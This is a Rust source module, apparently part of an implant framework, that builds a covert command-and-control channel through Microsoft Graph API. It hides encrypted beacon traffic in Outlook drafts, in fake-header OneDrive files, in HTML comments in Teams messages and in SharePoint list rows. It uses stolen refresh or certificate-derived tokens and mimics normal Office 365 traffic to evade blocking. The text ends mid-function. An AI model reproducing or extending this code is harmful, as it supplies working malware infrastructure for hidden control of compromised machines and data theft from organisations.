//! Microsoft Graph API covert C2 transport.
//!
//! This module implements a [`Transport`] that tunnels C2 messages through
//! Microsoft Graph API endpoints. Traffic to `graph.microsoft.com` is
//! indistinguishable from legitimate Office 365 / M365 traffic, making it
//! essentially impossible to block in enterprise environments without
//! breaking all Microsoft 365 functionality.
//!
//! # Supported Data Channels
//!
//! Four Graph API surfaces are available as C2 data channels:
//!
//! - **Outlook Email** (`OutlookChannel`): C2 data is stored in email drafts
//!   (never sent). The server reads/writes drafts via Graph API. Draft emails
//!   look like normal work-in-progress messages. Deleted after processing.
//!
//! - **OneDrive Files** (`OneDriveChannel`): C2 data is uploaded as files with
//!   legitimate-looking extensions (.xlsx, .docx, .pdf) to a OneDrive folder.
//!   Files are encrypted with valid-looking headers prepended. Deleted after
//!   processing.
//!
//! - **Teams Messages** (`TeamsChannel`): C2 data is embedded in HTML comments
//!   within Teams chat messages. Messages appear as normal Teams conversations.
//!
//! - **SharePoint List** (`SharePointChannel`): C2 data is stored as rows in
//!   a SharePoint list disguised as a project tracker. Each row contains
//!   encoded data in a "Description" column.
//!
//! # Authentication
//!
//! The transport uses Entra ID (Azure AD) access tokens. Tokens can be
//! obtained via:
//! - Pass-the-Certificate (via `entra_ptc` module)
//! - Stolen Primary Refresh Token (PRT)
//! - Credential-based auth (username/password + MFA token)
//! - Device code flow (interactive, one-time initial enrollment)
//!
//! Token refresh is handled automatically — Entra ID tokens expire every
//! ~60 minutes and are refreshed using the refresh token or client credentials.
//!
//! # Data Encryption
//!
//! All C2 data is encrypted with the agent's [`CryptoSession`] (AES-256-GCM)
//! BEFORE being encoded for the Graph channel. This ensures that even if the
//! TLS transport or the Graph API itself is compromised, no plaintext C2
//! data is ever exposed.
//!
//! # Rate Limiting
//!
//! Microsoft Graph API enforces per-tenant rate limits (typically 10,000
//! requests per 10 minutes). This transport throttles requests to stay well
//! within limits and applies jitter from the malleable profile.
//!
//! # Traffic Blending
//!
//! - Requests go to `graph.microsoft.com` — same domain as all Office 365
//!   traffic (Outlook, Teams, OneDrive, SharePoint).
//! - Request patterns mimic legitimate usage: periodic polling during work
//!   hours, reduced activity outside work hours.
//! - User-Agent and headers are indistinguishable from Microsoft Graph SDK.
//! - Data payloads look like normal content (email bodies, Office documents,
//!   Teams messages).

use anyhow::{anyhow, bail, Context, Result};
use async_trait::async_trait;
use base64::Engine;
use common::lock::MutexExt;
use common::{CryptoSession, Message, Transport};
use rand::Rng;
use serde::{Deserialize, Serialize};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::sync::RwLock;

// ── Constants ────────────────────────────────────────────────────────────────

/// Microsoft Graph API base URL (commercial cloud).
const GRAPH_BASE_URL: &str = "https://graph.microsoft.com/v1.0";

/// Microsoft Graph API base URL (government cloud).
const GRAPH_GOV_BASE_URL: &str = "https://graph.microsoft.us/v1.0";

/// Default folder name for OneDrive C2 data.
const DEFAULT_BEACON_FOLDER: &str = "OrchestraData";

/// Default polling interval in seconds.
const DEFAULT_POLLING_INTERVAL_SECS: u64 = 60;

/// Token refresh margin — refresh this many seconds before actual expiry.
const TOKEN_REFRESH_MARGIN_SECS: u64 = 300; // 5 minutes

/// Maximum number of items to retrieve per Graph API query.
const MAX_ITEMS_PER_QUERY: usize = 50;

/// Legitimate-looking file extensions for OneDrive channel.
const FILE_EXTENSIONS: &[&str] = &[
    "xlsx", // Excel spreadsheet
    "docx", // Word document
    "pdf",  // PDF document
    "pptx", // PowerPoint presentation
    "xlsx", // Weight Excel higher
];

/// Rate-limit backoff: seconds to wait on HTTP 429 (Too Many Requests).
const RATE_LIMIT_BACKOFF_SECS: u64 = 30;

/// Maximum consecutive rate-limit errors before giving up on a cycle.
const MAX_RATE_LIMIT_RETRIES: u32 = 3;

/// Maximum retries for transient server errors (5xx) before giving up.
const MAX_5XX_RETRIES: u32 = 3;

/// Initial backoff in seconds for 5xx retries (doubles each attempt).
const SERVER_ERROR_BACKOFF_SECS: u64 = 2;

/// Subject line prefix for Outlook draft emails.
const OUTLOOK_SUBJECT_PREFIX: &str = "RE: Project Update";

/// SharePoint list description (looks like a project tracker).
const SP_LIST_DESCRIPTION: &str = "Project milestone tracker for Q4 deliverables";

// ── Configuration ────────────────────────────────────────────────────────────

/// Configuration for the Microsoft Graph C2 transport.
///
/// Loaded from the `[c2_graph]` section of the malleable profile TOML.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub struct GraphC2Config {
    /// Whether the Graph C2 transport is enabled.
    #[serde(default)]
    pub enabled: bool,

    /// Which Graph data channel to use: "outlook", "onedrive", "teams", or "sharepoint".
    #[serde(default = "default_channel")]
    pub channel: String,

    /// Entra ID client ID (application registration).
    #[serde(default)]
    pub client_id: String,

    /// Entra ID tenant ID.
    #[serde(default)]
    pub tenant_id: String,

    /// Pre-obtained access token (for initial auth; will be refreshed).
    #[serde(default)]
    pub access_token: String,

    /// Refresh token for automatic token renewal.
    #[serde(default)]
    pub refresh_token: Option<String>,

    /// OneDrive / SharePoint folder name for C2 data.
    #[serde(default = "default_beacon_folder")]
    pub beacon_folder: String,

    /// Polling interval in seconds between C2 check-ins.
    #[serde(default = "default_polling_interval")]
    pub polling_interval_secs: u64,

    /// Teams chat ID (required when channel = "teams").
    #[serde(default)]
    pub teams_chat_id: Option<String>,

    /// SharePoint site ID (required when channel = "sharepoint").
    #[serde(default)]
    pub sharepoint_site_id: Option<String>,

    /// SharePoint list ID (created automatically if not set).
    #[serde(default)]
    pub sharepoint_list_id: Option<String>,

    /// Use Azure Government cloud instead of commercial.
    #[serde(default)]
    pub government_cloud: bool,

    /// Custom Graph API base URL (overrides default; for testing).
    #[serde(default)]
    pub custom_graph_url: Option<String>,

    /// Maximum file size in bytes for OneDrive uploads (default 4 MB).
    #[serde(default = "default_max_file_size")]
    pub max_file_size_bytes: u64,

    /// Kill date in `YYYY-MM-DD` format (UTC). After this date the agent
    /// will refuse to send or receive and will self-terminate.
    #[serde(default)]
    pub kill_date: String,

    /// Pre-shared key for session encryption and ECDH forward-secrecy
    /// authentication.  If empty, the `CryptoSession` passed to
    /// `GraphTransport::new()` is used as-is (no ECDH upgrade).
    #[serde(default)]
    pub psk: String,
}

fn default_channel() -> String {
    "onedrive".to_string()
}
fn default_beacon_folder() -> String {
    DEFAULT_BEACON_FOLDER.to_string()
}
fn default_polling_interval() -> u64 {
    DEFAULT_POLLING_INTERVAL_SECS
}
fn default_max_file_size() -> u64 {
    4 * 1024 * 1024 // 4 MB
}

impl Default for GraphC2Config {
    fn default() -> Self {
        Self {
            enabled: false,
            channel: default_channel(),
            client_id: String::new(),
            tenant_id: String::new(),
            access_token: String::new(),
            refresh_token: None,
            beacon_folder: default_beacon_folder(),
            polling_interval_secs: default_polling_interval(),
            teams_chat_id: None,
            sharepoint_site_id: None,
            sharepoint_list_id: None,
            government_cloud: false,
            custom_graph_url: None,
            max_file_size_bytes: default_max_file_size(),
            kill_date: String::new(),
            psk: String::new(),
        }
    }
}

// ── Authentication ───────────────────────────────────────────────────────────

/// OAuth 2.0 token response from Entra ID token endpoint.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct TokenEndpointResponse {
    access_token: String,
    #[serde(default = "default_token_type")]
    token_type: String,
    expires_in: u64,
    #[serde(default)]
    refresh_token: Option<String>,
    #[serde(default)]
    scope: Option<String>,
}

fn default_token_type() -> String {
    "Bearer".to_string()
}

/// Authenticated Graph API client with automatic token refresh.
///
/// The token pair (`access_token`, `refresh_token`, `token_expiry`) is stored
/// in a dedicated [`TokenPair`] struct so the three fields are always updated
/// together, eliminating the theoretical race where one field could be read
/// while another is mid-update during an async token refresh.
#[derive(Debug, Clone)]
pub struct GraphClient {
    /// HTTP client for Graph API requests.
    http_client: reqwest::Client,
    /// Current OAuth 2.0 token pair (access + refresh + expiry).
    tokens: TokenPair,
    /// Client ID for token refresh.
    client_id: String,
    /// Tenant ID for token refresh.
    tenant_id: String,
    /// Whether this is a government cloud tenant.
    government_cloud: bool,
    /// Custom Graph API base URL override (for testing).
    custom_graph_url: Option<String>,
}

/// Atomic token pair: all three fields are updated together during a refresh
/// so no caller can ever observe a mix of old and new credentials.
#[derive(Debug, Clone)]
struct TokenPair {
    /// Current access token.
    access_token: String,
    /// Refresh token for automatic renewal.
    refresh_token: Option<String>,
    /// Absolute time when the current access token expires.
    token_expiry: Instant,
}

impl GraphClient {
    /// Authenticate with a pre-obtained Entra ID access token.
    ///
    /// The token is typically obtained via Pass-the-Certificate, stolen PRT,
    /// or credential-based auth from the `entra_ptc` module. Token refresh
    /// requires a `refresh_token`.
    pub fn from_access_token(
        access_token: &str,
        refresh_token: Option<&str>,
        client_id: &str,
        tenant_id: &str,
        expires_in_secs: u64,
        government_cloud: bool,
        custom_graph_url: Option<&str>,
    ) -> Self {
        let http_client = reqwest::Client::builder()
            .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .build()
            .expect("failed to build reqwest client");

        Self {
            http_client,
            tokens: TokenPair {
                access_token: access_token.to_string(),
                refresh_token: refresh_token.map(|s| s.to_string()),
                token_expiry: Instant::now() + Duration::from_secs(expires_in_secs),
            },
            client_id: client_id.to_string(),
            tenant_id: tenant_id.to_string(),
            government_cloud,
            custom_graph_url: custom_graph_url.map(|s| s.to_string()),
        }
    }

    /// Authenticate via the OAuth 2.0 device code flow.
    ///
    /// This is an interactive flow: the user must visit a URL and enter a
    /// device code in their browser. Used for one-time initial enrollment
    /// when no pre-obtained token is available.
    ///
    /// NOT recommended for implant use — use `from_access_token` instead.
    pub async fn from_device_code(
        client_id: &str,
        tenant_id: &str,
        government_cloud: bool,
        custom_graph_url: Option<&str>,
    ) -> Result<Self> {
        let http_client = reqwest::Client::new();
        let token_base = if government_cloud {
            "https://login.microsoftonline.us"
        } else {
            "https://login.microsoftonline.com"
        };
        let device_code_url = format!("{}/{}/oauth2/v2.0/devicecode", token_base, tenant_id);

        // Step 1: Request device code.
        let resp: serde_json::Value = http_client
            .post(&device_code_url)
            .form(&[
                ("client_id", client_id),
                ("scope", "https://graph.microsoft.com/.default"),
            ])
            .send()
            .await?
            .json()
            .await?;

        let user_code = resp["user_code"]
            .as_str()
            .ok_or_else(|| anyhow!("device code response missing user_code"))?;
        let device_code = resp["device_code"]
            .as_str()
            .ok_or_else(|| anyhow!("device code response missing device_code"))?;
        let verification_uri = resp["verification_uri"]
            .as_str()
            .unwrap_or("https://microsoft.com/devicelogin");
        let interval = resp["interval"].as_u64().unwrap_or(5);

        tracing::warn!(
            "DEVICE CODE AUTH REQUIRED: visit {} and enter code {}",
            verification_uri,
            user_code
        );

        // Step 2: Poll for token completion.
        let token_url = format!("{}/{}/oauth2/v2.0/token", token_base, tenant_id);
        loop {
            tokio::time::sleep(Duration::from_secs(interval)).await;

            let token_resp: serde_json::Value = http_client
                .post(&token_url)
                .form(&[
                    ("client_id", client_id),
                    ("grant_type", "urn:ietf:params:oauth:grant-type:device_code"),
                    ("device_code", device_code),
                ])
                .send()
                .await?
                .json()
                .await?;

            if let Some(error) = token_resp["error"].as_str() {
                if error == "authorization_pending" {
                    continue;
                }
                bail!(
                    "device code auth failed: {} — {}",
                    error,
                    token_resp["error_description"]
                        .as_str()
                        .unwrap_or("unknown")
                );
            }

            let access_token = token_resp["access_token"]
                .as_str()
                .ok_or_else(|| anyhow!("token response missing access_token"))?;
            let expires_in = token_resp["expires_in"].as_u64().unwrap_or(3600);
            let refresh = token_resp["refresh_token"].as_str().map(String::from);

            return Ok(Self {
                http_client: reqwest::Client::builder()
                    .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
                    .build()?,
                tokens: TokenPair {
                    access_token: access_token.to_string(),
                    refresh_token: refresh,
                    token_expiry: Instant::now() + Duration::from_secs(expires_in),
                },
                client_id: client_id.to_string(),
                tenant_id: tenant_id.to_string(),
                government_cloud,
                custom_graph_url: custom_graph_url.map(|s| s.to_string()),
            });
        }
    }

    /// Return the Graph API base URL for this client.
    fn graph_base_url(&self) -> &str {
        if let Some(ref custom) = self.custom_graph_url {
            return custom.as_str();
        }
        if self.government_cloud {
            GRAPH_GOV_BASE_URL
        } else {
            GRAPH_BASE_URL
        }
    }

    /// Check if the current token is expired or about to expire.
    fn token_needs_refresh(&self) -> bool {
        Instant::now() + Duration::from_secs(TOKEN_REFRESH_MARGIN_SECS) >= self.tokens.token_expiry
    }

    /// Refresh the access token using the refresh token or client credentials.
    ///
    /// Returns `Ok(())` if refresh succeeded (token updated in place) or if
    /// no refresh was needed. Returns an error if refresh failed.
    async fn refresh_access_token(&mut self) -> Result<()> {
        if !self.token_needs_refresh() {
            return Ok(());
        }

        let token_base = if self.government_cloud {
            "https://login.microsoftonline.us"
        } else {
            "https://login.microsoftonline.com"
        };
        let token_url = format!("{}/{}/oauth2/v2.0/token", token_base, self.tenant_id);

        // Try refresh token grant first.
        if let Some(ref rt) = self.tokens.refresh_token {
            let resp = self
                .http_client
                .post(&token_url)
                .form(&[
                    ("client_id", self.client_id.as_str()),
                    ("grant_type", "refresh_token"),
                    ("refresh_token", rt.as_str()),
                    ("scope", "https://graph.microsoft.com/.default"),
                ])
                .send()
                .await
                .context("token refresh HTTP error")?;

            if resp.status().is_success() {
                let token_resp: TokenEndpointResponse = resp.json().await?;
                // Replace the entire token pair atomically so no caller ever
                // observes a mix of old access_token + new token_expiry.
                self.tokens = TokenPair {
                    access_token: token_resp.access_token,
                    refresh_token: token_resp
                        .refresh_token
                        .or_else(|| self.tokens.refresh_token.clone()),
                    token_expiry: Instant::now() + Duration::from_secs(token_resp.expires_in),
                };
                tracing::debug!("graph c2: token refreshed successfully");
                return Ok(());
            }
            tracing::warn!(
                "graph c2: refresh token grant failed, status: {}",
                resp.status()
            );
        }

        bail!("graph c2: cannot refresh token — no refresh token available")
    }

    /// Build an authenticated GET request to the Graph API.
    ///
    /// Retries automatically on transient 5xx server errors (MED-002).
    async fn get(&mut self, path: &str) -> Result<reqwest::Response> {
        self.refresh_access_token().await?;
        let url = format!("{}{}", self.graph_base_url(), path);
        let token = self.tokens.access_token.clone();
        let client = &self.http_client;
        let resp = self
            .retry_on_server_error(|| {
                let url = url.clone();
                let token = token.clone();
                async move {
                    client
                        .get(&url)
                        .header("Authorization", format!("Bearer {}", token))
                        .header("Content-Type", "application/json")
                        .send()
                        .await
                        .context("Graph API GET error")
                }
            })
            .await?;
        self.handle_rate_limit(resp).await
    }

    /// Build an authenticated POST request to the Graph API.
    ///
    /// The body is serialized to JSON bytes before the retry loop so that
    /// it can be replayed on transient 5xx errors (MED-002).
    async fn post(&mut self, path: &str, body: impl Serialize) -> Result<reqwest::Response> {
        self.refresh_access_token().await?;
        let url = format!("{}{}", self.graph_base_url(), path);
        let json_bytes = serde_json::to_vec(&body).context("Graph API POST serialize error")?;
        let token = self.tokens.access_token.clone();
        let client = &self.http_client;
        let resp = self
            .retry_on_server_error(|| {
                let url = url.clone();
                let token = token.clone();
                let json_bytes = json_bytes.clone();
                async move {
                    client
                        .post(&url)
                        .header("Authorization", format!("Bearer {}", token))
                        .header("Content-Type", "application/json")
                        .body(json_bytes)
                        .send()
                        .await
                        .context("Graph API POST error")
                }
            })
            .await?;
        self.handle_rate_limit(resp).await
    }

    /// Build an authenticated PUT request to the Graph API (for file upload).
    ///
    /// The body bytes are cloned for each retry attempt on transient 5xx
    /// errors (MED-002).
    async fn put_binary(&mut self, path: &str, data: Vec<u8>) -> Result<reqwest::Response> {
        self.refresh_access_token().await?;
        let url = format!("{}{}", self.graph_base_url(), path);
        let token = self.tokens.access_token.clone();
        let client = &self.http_client;
        let resp = self
            .retry_on_server_error(|| {
                let url = url.clone();
                let token = token.clone();
                let data = data.clone();
                async move {
                    client
                        .put(&url)
                        .header("Authorization", format!("Bearer {}", token))
                        .header("Content-Type", "application/octet-stream")
                        .body(data)
                        .send()
                        .await
                        .context("Graph API PUT error")
                }
            })
            .await?;
        self.handle_rate_limit(resp).await
    }

    /// Build an authenticated PATCH request to the Graph API.
    ///
    /// The body is serialized to JSON bytes before the retry loop so that
    /// it can be replayed on transient 5xx errors (MED-002).
    async fn patch(&mut self, path: &str, body: impl Serialize) -> Result<reqwest::Response> {
        self.refresh_access_token().await?;
        let url = format!("{}{}", self.graph_base_url(), path);
        let json_bytes = serde_json::to_vec(&body).context("Graph API PATCH serialize error")?;
        let token = self.tokens.access_token.clone();
        let client = &self.http_client;
        let resp = self
            .retry_on_server_error(|| {
                let url = url.clone();
                let token = token.clone();
                let json_bytes = json_bytes.clone();
                async move {
                    client
                        .patch(&url)
                        .header("Authorization", format!("Bearer {}", token))
                        .header("Content-Type", "application/json")
                        .body(json_bytes)
                        .send()
                        .await
                        .context("Graph API PATCH error")
                }
            })
            .await?;
        self.handle_rate_limit(resp).await
    }

    /// Build an authenticated DELETE request to the Graph API.
    ///
    /// Retries automatically on transient 5xx server errors (MED-002).
    async fn delete(&mut self, path: &str) -> Result<reqwest::Response> {
        self.refresh_access_token().await?;
        let url = format!("{}{}", self.graph_base_url(), path);
        let token = self.tokens.access_token.clone();
        let client = &self.http_client;
        let resp = self
            .retry_on_server_error(|| {
                let url = url.clone();
                let token = token.clone();
                async move {
                    client
                        .delete(&url)
                        .header("Authorization", format!("Bearer {}", token))
                        .send()
                        .await
                        .context("Graph API DELETE error")
                }
            })
            .await?;
        self.handle_rate_limit(resp).await
    }

    /// Handle HTTP 429 (Too Many Requests) rate limiting.
    ///
    /// On 429, reads the `Retry-After` header and sleeps for the indicated
    /// duration before returning the response. The caller should check the
    /// status code and handle non-success responses appropriately.
    async fn handle_rate_limit(&self, resp: reqwest::Response) -> Result<reqwest::Response> {
        if resp.status() == reqwest::StatusCode::TOO_MANY_REQUESTS {
            let retry_after = resp
                .headers()
                .get("Retry-After")
                .and_then(|v| v.to_str().ok())
                .and_then(|v| v.parse::<u64>().ok())
                .unwrap_or(RATE_LIMIT_BACKOFF_SECS);
            tracing::warn!("graph c2: rate limited (429), sleeping {}s", retry_after);
            tokio::time::sleep(Duration::from_secs(retry_after)).await;
        }
        Ok(resp)
    }

    /// Retry a request closure on transient 5xx server errors (MED-002).
    ///
    /// Executes the provided async closure and retries up to
    /// [`MAX_5XX_RETRIES`] times with exponential backoff starting at
    /// [`SERVER_ERROR_BACKOFF_SECS`] seconds.  Returns the first non-5xx
    /// response, or the last 5xx response if all retries are exhausted.
    async fn retry_on_server_error<F, Fut>(&self, mut do_request: F) -> Result<reqwest::Response>
    where
        F: FnMut() -> Fut,
        Fut: std::future::Future<Output = Result<reqwest::Response>>,
    {
        let mut attempt: u32 = 0;
        loop {
            let resp = do_request().await?;
            if !resp.status().is_server_error() {
                return Ok(resp);
            }
            attempt += 1;
            if attempt >= MAX_5XX_RETRIES {
                tracing::warn!(
                    "graph c2: server error {} after {} retries, giving up",
                    resp.status(),
                    attempt
                );
                return Ok(resp);
            }
            let backoff = SERVER_ERROR_BACKOFF_SECS * (1 << attempt);
            tracing::warn!(
                "graph c2: server error {} (attempt {}/{}), retrying in {}s",
                resp.status(),
                attempt,
                MAX_5XX_RETRIES,
                backoff
            );
            tokio::time::sleep(Duration::from_secs(backoff)).await;
        }
    }
}

// ── Data Encoding Helpers ────────────────────────────────────────────────────

/// Encode encrypted C2 bytes into a legitimate-looking email HTML body.
///
/// The encrypted data is base64-encoded and embedded in an HTML table
/// that looks like a normal work email with project data.
fn encode_email_body(encrypted_data: &[u8], beacon_id: &str) -> String {
    let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted_data);
    // Split into chunks that look like table cells.
    let chunk_size = 76;
    let rows: Vec<String> = b64
        .as_bytes()
        .chunks(chunk_size)
        .map(|chunk| {
            let cell = String::from_utf8_lossy(chunk);
            format!("<tr><td>{}</td><td>{}</td></tr>", cell, beacon_id)
        })
        .collect();

    format!(
        "<html><body>\
         <p>Hi team,</p>\
         <p>Please review the latest project metrics below:</p>\
         <table border=\"1\">\
         <tr><th>Metric</th><th>Project</th></tr>\
         {}\
         </table>\
         <p>Best regards</p>\
         </body></html>",
        rows.join("")
    )
}

/// Decode encrypted C2 bytes from an email HTML body.
///
/// Extracts the base64 data from the table cells and decodes it.
fn decode_email_body(html: &str) -> Result<Vec<u8>> {
    // Extract base64 from <td> cells — first column contains the data.
    let mut b64_chunks = Vec::new();
    let mut in_td = false;
    let mut td_count = 0u32;

    // Simple state-machine HTML parser for <td> extraction.
    for token in html.split('<') {
        if token.starts_with("td>") || token.starts_with("TD>") {
            in_td = true;
            td_count += 1;
            continue;
        }
        if token.starts_with("/td>") || token.starts_with("/TD>") {
            in_td = false;
            continue;
        }
        if in_td && td_count > 2 {
            // Skip header row (first two <td>), extract first column only
            // (odd-numbered cells are the data column).
            if td_count % 2 == 1 {
                let content = token
                    .trim()
                    .trim_end_matches('>')
                    .trim()
                    .trim_end_matches("</td")
                    .trim();
                if !content.is_empty() {
                    b64_chunks.push(content.to_string());
                }
            }
        }
    }

    if b64_chunks.is_empty() {
        bail!("no base64 data found in email body");
    }

    let b64_combined = b64_chunks.join("");
    let decoded = base64::engine::general_purpose::STANDARD
        .decode(&b64_combined)
        .context("failed to decode base64 from email body")?;
    Ok(decoded)
}

/// Generate a legitimate-looking filename for OneDrive uploads.
fn random_filename() -> String {
    let prefixes = [
        "Q4_Report",
        "Budget_2026",
        "Meeting_Notes",
        "Project_Plan",
        "Sales_Data",
        "Quarterly_Review",
        "Team_Summary",
        "Financials",
        "Presentation",
        "Strategy_Doc",
    ];
    let mut rng = rand::thread_rng();
    let prefix = prefixes[rng.gen_range(0..prefixes.len())];
    let suffix: u64 = rng.gen_range(1000..9999);
    let ext = FILE_EXTENSIONS[rng.gen_range(0..FILE_EXTENSIONS.len())];
    format!("{}_{}.{}", prefix, suffix, ext)
}

/// Prepend a fake ZIP/PDF header to encrypted data for OneDrive files.
///
/// This makes the file appear as a valid Office document when inspected
/// superficially (magic bytes check). The actual C2 data starts after the
/// header and can be extracted by knowing the header length.
fn prepend_file_header(data: &[u8], extension: &str) -> Vec<u8> {
    let header = if extension == "pdf" {
        // PDF magic: %PDF-1.4 followed by a benign comment.
        b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n".as_slice()
    } else {
        // ZIP magic (PK\x03\x04) — valid for .xlsx, .docx, .pptx.
        b"PK\x03\x04\x14\x00\x00\x00\x08\x00".as_slice()
    };

    // 4-byte little-endian length prefix so we know where header ends.
    let data_len = data.len() as u32;
    let mut out = Vec::with_capacity(header.len() + 4 + data.len());
    out.extend_from_slice(header);
    out.extend_from_slice(&data_len.to_le_bytes());
    out.extend_from_slice(data);
    out
}

/// Strip the fake file header and extract encrypted data.
fn strip_file_header(file_data: &[u8]) -> Result<Vec<u8>> {
    // Find the 4-byte length prefix after the header magic.
    // ZIP header is 10 bytes, PDF header is 15 bytes.
    let header_len = if file_data.starts_with(b"PK\x03\x04") {
        10
    } else if file_data.starts_with(b"%PDF") {
        15
    } else {
        // Unknown header — try without header (backwards compat).
        return Ok(file_data.to_vec());
    };

    if file_data.len() < header_len + 4 {
        bail!("file data too short to contain header + length prefix");
    }

    let data_len = u32::from_le_bytes(
        file_data[header_len..header_len + 4]
            .try_into()
            .context("failed to read data length")?,
    ) as usize;

    let data_start = header_len + 4;
    if file_data.len() < data_start + data_len {
        bail!(
            "file data truncated: expected {} bytes at offset {}, got {}",
            data_len,
            data_start,
            file_data.len() - data_start
        );
    }

    Ok(file_data[data_start..data_start + data_len].to_vec())
}

/// Encode encrypted data into a Teams message HTML body with hidden data.
fn encode_teams_message(encrypted_data: &[u8]) -> String {
    let b64 = base64::engine::general_purpose::STANDARD.encode(encrypted_data);
    format!(
        "<p>Hey, checking in on the project status. Let me know when you have a moment to review.</p>\
         <!-- {} -->",
        b64
    )
}

/// Decode encrypted data from a Teams message HTML body.
fn decode_teams_message(html: &str) -> Result<Vec<u8>> {
    // Extract from HTML comment: <!-- base64data -->
    let start_marker = "<!-- ";
    let end_marker = " -->";
    if let Some(start_idx) = html.find(start_marker) {
        let data_start = start_idx + start_marker.len();
        if let Some(end_idx) = html[data_start..].find(end_marker) {
            let b64 = &html[data_start..data_start + end_idx];
            let decoded = base64::engine::general_purpose::STANDARD
                .decode(b64)
                .context("failed to decode base64 from Teams message")?;
            return Ok(decoded);
        }
    }
    bail!("no HTML comment with C2 data found in Teams message")
}

// ── Graph API Response Types ─────────────────────────────────────────────────

/// Generic Graph API list response (OData).
#[derive(Debug, Clone, Serialize, Deserialize)]
struct GraphListResponse<T> {
    #[serde(rename = "@odata.context", default)]
    odata_context: Option<String>,
    #[serde(rename = "@odata.nextLink", default)]
    odata_next_link: Option<String>,
    #[serde(default)]
    value: Vec<T>,
}

/// Outlook message (email) object.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct OutlookMessage {
    id: Option<String>,
    subject: Option<String>,
    body: Option<OutlookBody>,
    #[serde(default)]
    is_draft: Option<bool>,
}

/// Email body content.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct OutlookBody {
    content_type: Option<String>,
    content: Option<String>,
}

/// Request body for creating an email draft.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct CreateDraftRequest {
    subject: String,
    body: EmailBodyContent,
}

/// Email body content for create/update requests.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct EmailBodyContent {
    content_type: String,
    content: String,
}

/// OneDrive drive item.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct DriveItem {
    id: Option<String>,
    name: Option<String>,
    size: Option<i64>,
    #[serde(default)]
    file: Option<DriveItemFile>,
}

/// File facet of a drive item.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct DriveItemFile {
    #[serde(rename = "mimeType", default)]
    mime_type: Option<String>,
}

/// Teams chat message.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct TeamsMessage {
    id: Option<String>,
    body: Option<TeamsItemBody>,
}

/// Teams message body.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
struct TeamsItemBody {
    content_type: Option<String>,
    content: Option<String>,
}

/// Request body for sending a Teams message.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct TeamsMessageRequest {
    body: TeamsItemBody,
}

/// SharePoint list item.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SharePointListItem {
    id: Option<String>,
    fields: Option<SharePointFields>,
}

/// SharePoint list item fields.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SharePointFields {
    title: Option<String>,
    description: Option<String>,
    status: Option<String>,
}

/// Request body for creating a SharePoint list item.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct CreateSpItemRequest {
    fields: CreateSpFields,
}

/// Fields for creating a SharePoint list item.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct CreateSpFields {
    title: String,
    description: String,
    status: String,
}

/// Request body for updating a SharePoint list item.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct UpdateSpFields {
    status: String,
}

/// SharePoint list creation request.
#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct CreateSpListRequest {
    display_name: String,
    description: String,
    columns: Vec<SpColumn>,
}

/// SharePoint list column definition.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct SpColumn {
    name: String,
    #[serde(rename = "text")]
    text_type: SpColumnText,
}

/// SharePoint text column definition.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct SpColumnText {
    #[serde(default)]
    max_length: Option<u32>,
}

/// SharePoint list metadata.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
struct SharePointList {
    id: Option<String>,
    display_name: Option<String>,
}

// ── Channel Trait ────────────────────────────────────────────────────────────

/// A specific Graph API data channel for C2 communication.
#[async_trait]
trait GraphChannel: Send + Sync {
    /// Send encrypted C2 data through this channel.
    async fn send_data(
        &self,
        client: &RwLock<GraphClient>,
        data: &[u8],
        beacon_id: &str,
    ) -> Result<()>;

    /// Receive encrypted C2 data from this channel.
    async fn receive_data(
        &self,
        client: &RwLock<GraphClient>,
        beacon_id: &str,
    ) -> Result<Vec<Vec<u8>>>;
}

// ── Outlook Email Channel ────────────────────────────────────────────────────

/// C2 channel using Outlook email drafts.
///
/// C2 data is encoded as an email draft (never sent). The server writes
/// command drafts; the agent reads them and writes response drafts. Drafts
/// are deleted after processing. This channel looks like normal Outlook
/// usage — creating and editing drafts is a common activity.
///
/// **Traffic pattern**: Periodic GET requests to
/// `graph.microsoft.com/v1.0/me/mailFolders/drafts/messages` (listing drafts)
/// with occasional POST (creating drafts) and DELETE (cleaning up).
/// This is indistinguishable from a user composing emails in Outlook.
pub struct OutlookChannel;

#[async_trait]
impl GraphChannel for OutlookChannel {
    async fn send_data(
        &self,
        client: &RwLock<GraphClient>,
        data: &[u8],
        beacon_id: &str,
    ) -> Result<()> {
        let html_body = encode_email_body(data, beacon_id);
        let subject = format!("{} - {}", OUTLOOK_SUBJECT_PREFIX, beacon_id);

        let request = CreateDraftRequest {
            subject: subject.clone(),
            body: EmailBodyContent {
                content_type: "HTML".to_string(),
                content: html_body,
            },
        };

        let mut guard = client.write().await;
        let resp = guard.post("/me/messages", &request).await?;

        if !resp.status().is_success() {
            let status = resp.status();
            let body = resp.text().await.unwrap_or_default();
            bail!("failed to create Outlook draft: HTTP {} — {}", status, body);
        }

        tracing::debug!(
            "graph c2 (outlook): created draft with subject '{}'",
            subject
        );
        Ok(())
    }

    async fn receive_data(
        &self,
        client: &RwLock<GraphClient>,
        beacon_id: &str,
    ) -> Result<Vec<Vec<u8>>> {
        let filter = format!(
